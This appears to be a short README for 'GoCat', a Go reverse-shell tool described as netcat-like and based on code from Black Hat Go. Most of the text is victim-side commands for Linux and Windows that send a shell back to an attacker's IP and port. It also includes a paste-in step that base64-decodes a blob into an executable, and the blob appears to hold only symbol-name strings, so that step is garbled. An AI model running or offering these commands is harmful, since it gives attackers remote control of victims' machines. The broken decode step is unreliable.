# GoCat
A self-contained implementation of a reverse shell (netcat-like). It is an improvement based on the source code found on the book blackhat Go 

## Author
Alan Lacerda (alacerda) | intruderLabs team

## Usage
The command accepts 2 parameter:

-p string

        Port where the attacker is expecting the reverse shell back.

-s string

        Attacker's IP address to send the shell back.

### Examples
If the attacker's IP address is 10.0.0.197 and the attacker started a listener on TCP port 9090 waiting for a connection back from the victim:

#### Linux Victim
./gocat -s 10.0.0.197 -p 9090

##### Linux without uploading
You can send the gocat to a linux box with base64 decode:

	echo MQBvcy9leGVjLigqQ21kKS5zdGRpbi5mdW5jMQBvcy9leGVjLigqQ21kKS53cml0ZXJEZXNjcmlwdG9yLmZ1bmMxAG9zL2V4ZWMuKCpDbWQpLlN0YXJ0LmZ1bmMxAG9zL2V4ZWMuKCpDbWQpLlN0YXJ0LmZ1bmMyAG9zL2V4ZWMuaW5pdC4wLmZ1bmMxAG9zL2V4ZWMuaW5pdABvcy9leGVjLigqRXhpdEVycm9yKS5TdHJpbmcAb3MvZXhlYy4oKkV4aXRFcnJvcikuU3lzAHR5cGUuLmVxLm9zL2V4ZWMuRXJyb3IAb3MvZXhlYy5FeGl0RXJyb3IuU3RyaW5nAG9zL2V4ZWMuRXhpdEVycm9yLlN5cwBtYWluLm1haW4AbWFpbi5oYW5kbGUA | base64 -d > gocat && chmod +x gocat

#### Windows victim
gocat.exe -s 10.0.0.197 -p 9090

